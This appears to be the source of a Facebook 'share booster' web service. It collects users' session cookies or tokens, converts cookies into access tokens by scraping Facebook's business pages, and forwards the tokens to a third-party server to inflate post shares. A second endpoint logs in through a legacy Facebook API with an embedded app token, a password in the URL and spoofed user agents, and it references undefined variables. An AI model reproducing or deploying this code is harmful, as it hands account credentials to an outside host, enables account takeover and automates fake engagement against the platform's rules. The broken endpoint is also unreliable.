const cf = require("./wse-express/index");
const app = new cf();

const axios = require('axios');

function randomize(neth) {
  let _=Math.random()*12042023;
  return neth.replace(/[xy]/g,c=>{
    let __=Math.random()*16; 
    __=(__+_)%16|0;_=Math.floor(_/16);
    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
  });
}
function userAgent() {
  const version = () => {
    const android = Math.floor(Math.random() * 14) + 1;
    if (android <= 4) {
      return "10";
    }
    if (android === 5) {
      const ver = ["5.0", "5.0.1", "5.1.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 6) {
      const ver = ["6.0", "6.0.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 7) {
      const ver = ["7.0.1", "7.1.1", "7.1.2"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 8) {
      const ver = ["8.0.0", "8.1.0"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else {
      return android;
    }
  }
  return `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
} 
app.get('/', async (req, res) => {
  return res.custom(null, {
    "Location": "https://sharebooster.pages.dev"
  }, 308);
});

app.get('/submit', async (req, res) => {
  if (req.method() === 'GET'){
    return res.send("You cannot GET this request. This uses POST.", 403);
  }
  const {
    cookie,
    url,
    amount,
    interval,
  } = await req.body();
  if (!cookie || !url || !amount || !interval)
  return res.json({
    status: 400,
    error: 'Missing token/cookie, url, amount, or interval'
  });
  try {
    const cookies = (cookie.startsWith("EAA")) ? cookie : await convertCookie(cookie);
    if (!cookies){
      return res.json({
        status: 400,
        error: 'Detect invalid appstate or token. Please enter a valid appstate or token!!'
      });
    }
    const axio = await axios.get("https://echavezwiegine.onrender.com/sh", {
      params: {
        cookie: cookies,
        url,
        amount,
        interval
      }
    });
    if (axio.data.status === 200){ 
    return res.json({
      status: 200,
      message: "Successfully sent to the server. Please wait for the sharing process and check your post\'s shares."
    });
    } else {
    return res.json({
      status: 400,
      error: "Something went wrong happened. Please try again or contact the developer!"
    })
    }
  } catch (err) {
    return res.json({
      status: 400,
      error: err.message || err
    });
  }
});

app.get("/tttt", async(req, res) => {
  const { u,p } = req.query();
  const headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en_US',
      'cache-control': 'max-age=0',
      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': "Windows",
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': userAgent()
    };
  const response = await axios.get(`https://api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=${email}&locale=en_US&password=${password}&sdk=ios&generate_session_cookies=1&sig=${randomize("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx").toLowerCase()}`,
  { headers })
  .catch(error => {
    return; 
  });
  const res = await axios.get(`https://b-api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${response.data.access_token}&new_app_id=275254692598279`,
  { headers })
  .catch(error => {
    return;
  });
  if (response.data.access_token || res.data.access_token)
  return res.json({
    status: true,
    message: "Fetching token success!",
    token1: res.data.access_token,
    token2: response.data.access_token,
  })
});
async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return accessToken;
    }
  } catch (error) {
    return;
  }
}
async function convertCookie(cookie) {
  try {
    const ck = JSON.parse(cookie);
    //if (ck && ck.has("sb")){
    const ck1 = ck.map(c => `${c.key}=${c.value}`).join('; ');
    const token = await getAccessToken(ck1);
    return token; //token from cookie(EAAGN)
    /*} else {
      return cookie;
    }*/
  } catch (e){
    return;
  }
}

addEventListener('fetch', async(event) => {
  event.respondWith(app.handleRequest(event));
});